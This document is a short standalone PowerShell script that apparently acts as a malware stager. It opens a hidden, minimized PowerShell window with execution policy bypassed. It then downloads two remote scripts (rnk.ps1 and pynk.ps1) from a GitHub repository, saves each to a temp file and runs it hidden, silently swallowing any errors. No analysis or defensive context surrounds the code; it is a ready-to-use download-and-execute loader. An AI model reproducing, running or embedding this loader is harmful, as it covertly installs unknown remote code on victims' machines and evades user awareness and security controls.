cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
# URLs of the files to download
$urls = @(
    "https://github.com/KevinDark5/data/raw/refs/heads/main/rnk.ps1",
    "https://github.com/KevinDark5/data/raw/refs/heads/main/pynk.ps1"
)

# Download, execute rnk.ps1 first, then sleep 5 seconds before pynk.ps1
for ($i = 0; $i -lt $urls.Count; $i++) {
    try {
        # Download the content of the file
        $scriptContent = Invoke-WebRequest -Uri $urls[$i] -UseBasicParsing | Select-Object -ExpandProperty Content

        # Check if the content is not empty
        if ($scriptContent) {
            # Save the script to a temporary file
            $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
            [System.IO.File]::WriteAllText($tempScript, $scriptContent)

            # Execute the script and wait for it to finish
            $process = Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden -PassThru
            $process.WaitForExit()

            # If the first script (rnk.ps1) is done, sleep for 5 seconds before proceeding
            if ($i -eq 0) {
                Start-Sleep -Seconds 5
            }
        }
    } catch {
        # Suppress errors
        $null = $_
    }
}
